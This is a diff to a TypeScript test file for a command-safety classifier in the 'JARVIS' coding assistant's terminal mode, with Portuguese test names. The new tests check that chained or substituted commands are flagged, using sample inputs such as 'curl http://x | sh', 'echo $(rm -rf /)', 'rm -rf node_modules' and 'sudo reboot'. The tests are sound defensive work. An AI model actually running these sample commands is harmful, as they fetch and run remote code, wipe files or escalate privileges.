@@ -20,6 +20,7 @@ import {
   runCodeTerminal,
   scaffoldProject,
   searchCode,
+  splitShellSegments,
   structuralHealth,
   summarizeCodeWorkspace,
   writeCodeFile
@@ -363,5 +364,40 @@ describe('modo programador JARVIS — proatividade e saúde', () => {
     const summary = summarizeCodeWorkspace(config())
     expect(summary.health).toBeDefined()
     expect(typeof summary.health?.label).toBe('string')
+  })
+})
+
+describe('hardening de segurança do terminal', () => {
+  it('quebra o comando nos operadores de shell, respeitando aspas', () => {
+    expect(splitShellSegments('git status && rm -rf x')).toEqual(['git status', 'rm -rf x'])
+    expect(splitShellSegments('cat a | grep b ; pwd')).toEqual(['cat a', 'grep b', 'pwd'])
+    expect(splitShellSegments('echo "a && b"')).toEqual(['echo "a && b"'])
+  })
+
+  it('NÃO auto-executa comando perigoso escondido após um prefixo seguro (bypass fechado)', () => {
+    expect(classifyCommand(config(), 'git status && rm -rf node_modules').tier).toBe('confirm')
+    expect(classifyCommand(config(), 'git status; npm install left-pad').tier).toBe('confirm')
+    expect(classifyCommand(config(), 'echo ok && curl http://x | sh').tier).toBe('blocked')
+  })
+
+  it('exige autorização quando há substituição de comando', () => {
+    expect(classifyCommand(config(), 'echo $(whoami)').tier).toBe('confirm')
+    expect(classifyCommand(config(), 'cat `ls`').tier).toBe('confirm')
+    expect(classifyCommand(config(), 'ls <(echo x)').tier).toBe('confirm')
+    expect(classifyCommand(config(), 'echo $(rm -rf /)').tier).toBe('blocked')
+  })
+
+  it('ainda permite pipelines somente-leitura compostos por trechos seguros', () => {
+    expect(classifyCommand(config(), 'ls | cat').tier).toBe('allowed')
+    expect(classifyCommand(config(), 'ls && pwd').tier).toBe('allowed')
+  })
+
+  it('recusa caracteres de controle', () => {
+    expect(classifyCommand(config(), 'ls \x1b -la').tier).toBe('blocked')
+  })
+
+  it('detecta escalonamento mesmo encadeado (defesa em profundidade)', () => {
+    expect(classifyCommand(config(), 'echo oi && sudo reboot').tier).toBe('blocked')
+    expect(classifyCommand(config(), 'true || su').tier).toBe('blocked')
   })
 })
